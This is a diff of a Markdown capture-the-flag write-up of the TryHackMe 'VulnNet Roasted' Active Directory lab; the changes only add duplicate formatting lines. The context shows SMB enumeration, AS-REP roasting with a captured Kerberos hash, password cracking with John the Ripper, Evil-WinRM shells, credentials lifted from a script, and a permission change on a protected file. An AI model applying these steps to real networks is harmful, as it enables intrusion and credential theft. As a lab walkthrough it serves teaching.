@@ -50,6 +50,7 @@ Host script results:
 |_  start_date: N/A
 ```
 {: .nolineno}
+{: .nolineno}
 ## SMB Enumeration ⤵️
 
 I got this domain name from this null credentials login attempt 🔽
@@ -79,6 +80,7 @@ j-goldenhand
 j-leet
 ```
 {: .nolineno}
+{: .nolineno}
 I then performed **<span style="color:#61ffe5">AS-REP-ROASTING</span>** using `GetNPUsers.py` Tool from impackets and I got this result 🔽
 ```bash
 ┌──(kali🔥kali)-[~/Downloads/Tryhackme/VulnNet_Roasted]
@@ -96,6 +98,7 @@ $krb5asrep$23$t-skid@VULNNET-RST.LOCAL:29348c9e50198d204c7491fd8dbba0e1$493e4943
 [-] User j-leet does not have UF_DONT_REQUIRE_PREAUTH set
 ```
 {: .nolineno}
+{: .nolineno}
 Now I will be using John The Ripper to crack this hash value 🔻
 ```bash
 ┌──(kali🔥kali)-[~/Downloads/Tryhackme/VulnNet_Roasted]
@@ -109,6 +112,7 @@ Press 'q' or Ctrl-C to abort, almost any other key for status
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed. 
 ```
+{: .nolineno}
 {: .nolineno}
 Now lets see what privileges does this user got 🔽
 ![Image](Pasted%20image%2020240226221910.png)
@@ -153,6 +157,7 @@ THM{FLAG_FLAG_FLAG_FLAG_FLAG}
 *Evil-WinRM* PS C:\Users\enterprise-core-vn> 
 ```
 {: .nolineno}
+{: .nolineno}
 Now I looked into SMB shares for some new file access 🔽
 ```bash
 ┌──(kali🔥kali)-[~/Downloads/Tryhackme/VulnNet_Roasted]
@@ -186,11 +191,13 @@ getting file \vulnnet-rst.local\scripts\ResetPassword.vbs of size 2821 as ResetP
 smb: \vulnnet-rst.local\scripts\> exit
 ```
 {: .nolineno}
+{: .nolineno}
 I downloaded this **<span style="color:#fd77f8">ResetPassword.vbs</span>** and found the credentials for a new user 🔻
 ```bash
 strUserNTName = "a-whitehat"
 strPassword = "<PASSWORD>"
 ```
+{: .nolineno}
 {: .nolineno}
 Lets see its privileges in bloodhound also 🔽
 ![Image](Pasted%20image%2020240227195623.png)
@@ -283,6 +290,7 @@ At line:1 char:1
 *Evil-WinRM* PS C:\Users\Administrator>
 ```
 {: .nolineno}
+{: .nolineno}
 I can't access <span style="color:#ffff00">system.txt</span> file so lets check the permissions of this file 🔽
 ```powershell
 *Evil-WinRM* PS C:\Users\Administrator> icacls Desktop\system.txt
@@ -292,6 +300,7 @@ Desktop\system.txt NT AUTHORITY\SYSTEM:(F)
 Successfully processed 1 files; Failed processing 0 files
 *Evil-WinRM* PS C:\Users\Administrator>
 ```
+{: .nolineno}
 {: .nolineno}
 Now I see that I am user **<span style="color:#ffff00">a-whitehat</span>** so I don't have access to this file but I can change permissions like this 🔽
 ```powershell
@@ -308,6 +317,7 @@ Desktop\system.txt VULNNET-RST\a-whitehat:(F)
 Successfully processed 1 files; Failed processing 0 files
 *Evil-WinRM* PS C:\Users\Administrator>
 ```
+{: .nolineno}
 {: .nolineno}
 For Administrator shell I could run `secretsdump.py` that will extract the `NTLM` hash for all the users but I am happy with **<span style="color:#ffff00">a-whitehat</span>** user .
 I am <span style="color:#61ffe5">Domain Admin</span> now !!
